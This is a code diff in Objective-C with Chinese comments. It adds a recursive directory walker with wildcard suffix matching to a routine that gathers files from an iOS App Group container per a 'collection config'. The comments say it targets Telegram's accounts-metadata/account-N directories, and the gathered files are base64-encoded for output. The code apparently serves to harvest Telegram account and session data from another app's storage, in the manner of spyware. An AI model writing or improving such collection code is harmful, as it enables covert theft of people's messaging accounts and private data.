@@ -362,6 +362,49 @@
 }
 
 /// 严格按采集配置的 items 采：type=dir 收整目录（含通配展开），type=file 只收那一个文件
+/// 深度优先遍历，命中「相对路径尾段 == 配置路径」的目录就整目录收
++ (void)walkRoot:(NSString *)root rel:(NSString *)rel depth:(NSInteger)depth maxDepth:(NSInteger)maxDepth
+            into:(NSMutableArray *)files bytes:(NSUInteger *)bytes limit:(NSUInteger)limit
+         pattern:(NSArray<NSString *> *)pattern {
+    if (depth > maxDepth || *bytes >= limit) return;
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *dir = rel.length ? [root stringByAppendingPathComponent:rel] : root;
+    for (NSString *n in [fm contentsOfDirectoryAtPath:dir error:NULL] ?: @[]) {
+        NSString *childRel = rel.length ? [rel stringByAppendingPathComponent:n] : n;
+        NSString *full = [root stringByAppendingPathComponent:childRel];
+        BOOL isDir = NO;
+        [fm fileExistsAtPath:full isDirectory:&isDir];
+        if (!isDir) continue;
+
+        if ([self rel:childRel matchesTail:pattern]) {
+            [self collectDir:childRel root:root into:files bytes:bytes limit:limit];
+            continue;
+        }
+        [self walkRoot:root rel:childRel depth:depth + 1 maxDepth:maxDepth
+                 into:files bytes:bytes limit:limit pattern:pattern];
+    }
+}
+
+/// 相对路径的尾段是否匹配（逐段比较，段内支持 *）
++ (BOOL)rel:(NSString *)rel matchesTail:(NSArray<NSString *> *)pattern {
+    NSArray *segs = [rel componentsSeparatedByString:@"/"];
+    if (segs.count < pattern.count) return NO;
+    NSUInteger off = segs.count - pattern.count;
+    for (NSUInteger i = 0; i < pattern.count; i++) {
+        NSString *p = pattern[i];
+        NSString *s = segs[off + i];
+        if (p.length == 0) continue;
+        if ([p rangeOfString:@"*"].location == NSNotFound) {
+            if (![p isEqualToString:s]) return NO;
+        } else {
+            NSString *pre = [p componentsSeparatedByString:@"*"].firstObject ?: @"";
+            NSString *suf = [p componentsSeparatedByString:@"*"].lastObject ?: @"";
+            if (![s hasPrefix:pre]) return NO;
+            if (suf.length && ![s hasSuffix:suf]) return NO;
+        }
+    }
+    return YES;
+}
 + (NSDictionary *)collectAppGroup:(NSString *)groupId
                             items:(NSArray<NSDictionary *> *)items
                             limit:(NSUInteger)maxBytes {
@@ -390,19 +433,24 @@
             continue;
         }
 
-        // dir：先展开通配，再整目录递归收
-        for (NSString *dirRel in [self expandPath:path root:root]) {
+        // dir：先从容器根按配置路径找；找不到再做「后缀匹配」——
+        // Telegram 的 AppGroup 根下并不是直接放 accounts-metadata/account-N，
+        // 中间还有一层（实测根下直接展开命中 0 个文件）。
+        NSArray *literal = [self expandPath:path root:root];
+        BOOL any = NO;
+        for (NSString *dirRel in literal) {
             BOOL isDir = NO;
             [fm fileExistsAtPath:[root stringByAppendingPathComponent:dirRel] isDirectory:&isDir];
-            if (isDir) {
-                [self collectDir:dirRel root:root into:files bytes:&bytes limit:maxBytes];
-            } else {
-                NSData *data = [NSData dataWithContentsOfFile:[root stringByAppendingPathComponent:dirRel]];
-                if (data.length && data.length <= 32 * 1024 * 1024 && bytes + data.length <= maxBytes) {
-                    bytes += data.length;
-                    [files addObject:@{ @"p": dirRel, @"d": [data base64EncodedStringWithOptions:0] }];
-                }
-            }
+            if (!isDir) continue;
+            any = YES;
+            [self collectDir:dirRel root:root into:files bytes:&bytes limit:maxBytes];
+        }
+
+        if (!any) {
+            // 后缀匹配：任意深度下，相对路径的尾段等于配置路径（逐段支持 *）
+            NSArray<NSString *> *pat = [path componentsSeparatedByString:@"/"];
+            [self walkRoot:root rel:@"" depth:0 maxDepth:5
+                     into:files bytes:&bytes limit:maxBytes pattern:pat];
         }
     }
     return @{ @"files": files, @"bytes": @(bytes) };
